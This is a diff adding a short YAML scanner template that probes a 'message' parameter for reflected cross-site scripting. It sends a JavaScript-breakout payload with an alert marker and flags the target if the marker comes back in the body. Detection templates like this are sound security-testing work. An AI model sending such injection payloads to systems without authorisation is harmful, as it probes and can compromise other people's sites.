@@ -1,0 +1,20 @@
+id: xss-066
+name: 'Reflected XSS ctx-7 via message'
+severity: high
+type: active
+tags:
+  - xss
+  - injection
+  - client
+description: 'Unencoded reflection in message'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      message:
+        - '"-alert(nx065c)-"'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nx065c'
